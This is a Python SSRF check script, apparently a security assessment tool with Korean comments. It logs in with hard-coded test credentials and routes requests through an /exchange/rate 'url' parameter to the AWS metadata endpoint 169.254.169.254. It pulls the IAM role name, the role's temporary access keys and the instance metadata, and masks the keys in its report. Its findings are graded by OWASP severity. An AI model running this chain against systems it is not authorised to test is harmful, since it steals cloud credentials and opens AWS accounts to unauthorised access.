import requests
import json
import re
from datetime import datetime

def mask_credentials(text):
    text = re.sub(r'("AccessKeyId"\s*:\s*")[^"]+(")', r'\1****MASKED****\2', text)
    text = re.sub(r'("SecretAccessKey"\s*:\s*")[^"]+(")', r'\1****MASKED****\2', text)
    text = re.sub(r'("Token"\s*:\s*")[^"]+(")', r'\1****MASKED****\2', text)
    return text

def get_token(base_url, username="alice", password="alice1234"):
    resp = requests.post(f"{base_url}/auth/login", json={
        "username": username, "password": password
    })
    if resp.status_code == 200:
        return resp.json()["access_token"]
    raise Exception(f"로그인 실패: {resp.text}")

def ssrf_check(base_url):
    result = {
        "scan_id": "SSRF",
        "target": base_url,
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "vulnerabilities": []
    }

    try:
        token = get_token(base_url)
    except Exception as e:
        result["error"] = str(e)
        return result

    headers = {"Authorization": f"Bearer {token}"}

    # SSRF-001: IAM 역할 이름 노출
    role_name = None
    try:
        resp = requests.get(f"{base_url}/exchange/rate",
            params={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
            headers=headers, timeout=5)
        raw = resp.json().get("raw", "").strip()
        if raw:
            role_name = raw.split("\n")[0].strip()

        result["vulnerabilities"].append({
            "id": "SSRF-001",
            "type": "SSRF",
            "severity": "High",
            "status": "취약" if role_name else "양호",
            "owasp": "A10:2021 - Server-Side Request Forgery",
            "endpoint": "/exchange/rate",
            "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "detected_keywords": ["meta-data"],
            "evidence": f"IAM 역할명({role_name}) 노출 확인" if role_name else "IAM 역할 없음",
            "description": "IAM 역할 목록 노출 — 역할명 파악 후 크레덴셜 탈취 시도 가능"
        })
    except Exception as e:
        pass

    # SSRF-002: 실제 크레덴셜 탈취
    if role_name:
        try:
            resp = requests.get(f"{base_url}/exchange/rate",
                params={"url": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"},
                headers=headers, timeout=5)
            raw = resp.json().get("raw", "")
            keywords = ["AccessKeyId", "SecretAccessKey", "Token"]
            found = [kw for kw in keywords if kw in raw]

            result["vulnerabilities"].append({
                "id": "SSRF-002",
                "type": "SSRF",
                "severity": "Critical",
                "status": "취약" if found else "양호",
                "owasp": "A10:2021 - Server-Side Request Forgery",
                "endpoint": "/exchange/rate",
                "payload": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
                "detected_keywords": found,
                "evidence": mask_credentials(raw[:300]),
                "description": "IAM 임시 크레덴셜(AccessKeyId, SecretAccessKey, Token) 탈취 성공 — AWS 서비스 무단 접근 가능"
            })
        except Exception as e:
            pass

    # SSRF-003: EC2 메타데이터 노출
    try:
        resp = requests.get(f"{base_url}/exchange/rate",
            params={"url": "http://169.254.169.254/latest/meta-data/"},
            headers=headers, timeout=5)
        raw = resp.json().get("raw", "")

        result["vulnerabilities"].append({
            "id": "SSRF-003",
            "type": "SSRF",
            "severity": "High",
            "status": "취약" if raw else "양호",
            "owasp": "A10:2021 - Server-Side Request Forgery",
            "endpoint": "/exchange/rate",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "detected_keywords": ["meta-data"],
            "evidence": f"노출 항목: {', '.join(raw.split()[:10])}..." if raw else "응답 없음",
            "description": "EC2 인스턴스 메타데이터 전체 노출 — 인스턴스 ID, 호스트명, 네트워크 정보 등 수집 가능"
        })
    except Exception as e:
        pass

    return result